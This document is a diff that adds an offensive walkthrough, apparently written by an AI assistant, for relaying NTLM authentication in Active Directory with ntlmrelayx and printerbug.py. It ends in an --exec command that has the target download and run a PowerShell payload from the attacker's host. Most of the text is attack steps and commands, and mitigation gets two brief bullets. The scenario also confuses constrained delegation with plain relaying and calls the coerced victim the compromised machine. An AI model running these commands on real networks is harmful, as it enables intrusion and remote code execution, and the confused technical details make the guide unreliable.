@@ -431,3 +431,136 @@ You need to identify a vulnerable machine account that you can manipulate for RB
 3. **Dump Hashes**: Use `secretsdump.py` with the TGS ticket to dump hashes from the DC.
 
 This attack path allows you to impersonate a privileged account and perform sensitive operations on a Domain Controller, including dumping password hashes.
+
+### Scenario: Using `ntlmrelayx` for Relay Attack in a Misconfigured Active Directory Environment
+
+#### **Tool Overview: `ntlmrelayx`**
+
+`ntlmrelayx` is part of the **Impacket** suite and is commonly used to perform **NTLM relay attacks**. NTLM relay attacks allow an attacker to intercept and relay authentication attempts from one host to another, taking advantage of insecure network configurations (e.g., SMB signing disabled or weak authentication mechanisms). This tool is often used in **pass-the-hash** or **pass-the-ticket** scenarios, as well as in exploiting misconfigurations in **Active Directory** environments.
+
+### Scenario: **Abusing NTLM Relay with Misconfigured SMB and Constrained Delegation**
+
+In this scenario, you’ll use **`ntlmrelayx`** to capture and relay authentication attempts from a user or machine account that has **constrained delegation** enabled, leading to remote code execution (RCE) on another server.
+
+#### **Background Setup**
+1. **Domain Configuration**:
+    - The domain is configured with **constrained delegation** enabled, which means that certain service accounts are allowed to authenticate as other users for specific services (e.g., CIFS/SMB, HTTP).
+    - SMB signing is **disabled** on several machines, including the one you’ll target for NTLM relay.
+  
+2. **Attacker Capabilities**:
+    - You have compromised a low-privileged machine on the network.
+    - You want to escalate privileges by exploiting a machine account that can authenticate to services using **constrained delegation**.
+
+3. **Target**:
+    - The target is a server (e.g., **fileserver01**) with **CIFS/SMB** service, and the machine account of **webserver01** has constrained delegation enabled to **CIFS** on **fileserver01**.
+
+---
+
+### Step-by-Step Exploitation with `ntlmrelayx`
+
+#### **Step 1: Identify Machines with Constrained Delegation**
+
+You first need to enumerate machines with **constrained delegation** enabled. This can be done using **PowerView**:
+
+```powershell
+Get-DomainComputer -TrustedToAuth | Select-Object Name, msDS-AllowedToDelegateTo
+```
+
+This command will return a list of machines and their associated services for which they can delegate credentials. For example, it may return that **webserver01** can delegate to **CIFS/fileserver01.domain.com**.
+
+#### **Step 2: Check for SMB Signing Disabled on Target Machines**
+
+Before launching the relay attack, check if SMB signing is disabled on target machines. You can use PowerShell for this:
+
+```powershell
+Invoke-Command -ComputerName fileserver01 -ScriptBlock {
+    Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature
+}
+```
+
+If `RequireSecuritySignature` is **false**, SMB signing is disabled, and the machine is vulnerable to an SMB relay attack.
+
+#### **Step 3: Setup `ntlmrelayx`**
+
+You’ll use `ntlmrelayx` to relay NTLM authentication from **webserver01** (the compromised machine) to **fileserver01** (the target server with CIFS/SMB enabled).
+
+On your attacker machine (e.g., **attackerbox01**), configure `ntlmrelayx` to listen for NTLM authentication requests and relay them to **fileserver01**. You’ll want to capture incoming connections and relay them to the **CIFS/SMB** service on the target:
+
+```bash
+ntlmrelayx.py -smb2support --no-smb-server --target smb://fileserver01.domain.com
+```
+
+- The `-smb2support` flag ensures compatibility with SMBv2, which is common on modern Windows systems.
+- The `--target` flag specifies the target server you want to relay authentication to (in this case, **fileserver01**).
+
+#### **Step 4: Coerce Authentication from the Delegated Machine (WebServer)**
+
+To perform an NTLM relay attack, you need to coerce an NTLM authentication attempt from **webserver01** (which has constrained delegation). You can achieve this by forcing **webserver01** to authenticate to your attacker machine by using a tool like **`printerbug.py`** from the **Impacket** suite.
+
+Run the following command on your attacking machine (attackerbox01) to trigger the authentication:
+
+```bash
+printerbug.py domain.com/webserver01 attackerbox01
+```
+
+This command will trigger **webserver01** to authenticate to your attacking machine **attackerbox01** using NTLM. Once the authentication is relayed to **fileserver01**, `ntlmrelayx` will intercept it.
+
+#### **Step 5: Relay Authentication to Fileserver01**
+
+Once **webserver01** authenticates to your machine, `ntlmrelayx` will relay the credentials to **fileserver01** and authenticate as **webserver01** using NTLM relay.
+
+At this point, `ntlmrelayx` has authenticated as **webserver01** to **fileserver01** and has access to the **CIFS/SMB** service on that server. Depending on the level of access **webserver01** has, you can now perform various actions such as:
+
+- Listing files on the **CIFS/SMB** share.
+- Writing files (e.g., planting a malicious payload).
+- Executing code remotely via a **psexec-style attack**.
+
+#### **Step 6: Execute Code Remotely via CIFS/SMB**
+
+Once you have relayed the credentials to **fileserver01**, you can now attempt to execute commands remotely. Using **`ntlmrelayx`** with the `--exec` flag, you can drop a reverse shell or other payloads onto the target.
+
+For example, to execute a command on **fileserver01**:
+
+```bash
+ntlmrelayx.py -smb2support --no-smb-server --target smb://fileserver01.domain.com --exec "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attackerbox01/payload.ps1')"
+```
+
+This command would download and execute a malicious PowerShell script from the attacker's machine on **fileserver01**, leading to remote code execution.
+
+---
+
+### Summary of Steps
+
+1. **Enumerate machines with constrained delegation** (e.g., **webserver01** can delegate to **fileserver01** via CIFS).
+2. **Verify SMB signing is disabled** on the target machine (fileserver01).
+3. **Run `ntlmrelayx`** on your attacker machine to relay authentication.
+4. **Coerce authentication** from the delegated machine (webserver01) to your attacker machine (attackerbox01) using **printerbug.py** or another method.
+5. **Relay the authentication** to the target machine (fileserver01).
+6. **Execute commands** remotely, leveraging the CIFS/SMB access you’ve gained.
+
+---
+
+### General Use Case for NTLM Relay
+
+#### Common Scenario: NTLM Relay in an Internal Network with SMB Signing Disabled
+
+NTLM relay attacks are common in environments where:
+- SMB signing is disabled.
+- NTLM authentication is used.
+- There is **no mutual authentication** for protocols such as SMB or LDAP, allowing attackers to relay captured NTLM hashes to another service without needing to crack or know the plaintext password.
+
+#### Attack Flow:
+1. **Poison Authentication Requests**: Use tools like **Responder** to capture NTLM authentication requests.
+2. **Relay Authentication**: Use `ntlmrelayx.py` to relay the authentication to a service that the user has access to, such as an SMB share or LDAP directory.
+3. **Gain Access**: Once relayed, the attacker has the same access as the user to the targeted service.
+
+---
+
+### Other Considerations:
+
+- **Mitigations**: Enforcing SMB signing and using **Kerberos** authentication wherever possible can mitigate NTLM relay attacks. Kerberos is resistant to these types of relays since it requires mutual authentication between the client and the server.
+- **Detecting NTLM Relay Attacks**: Monitoring for suspicious network activity, such as failed SMB connections or the unexpected creation of service tickets, can help detect NTLM relay attacks.
+
+---
+
+Would you like a more detailed explanation of any specific step in this process, or explore additional scenarios?
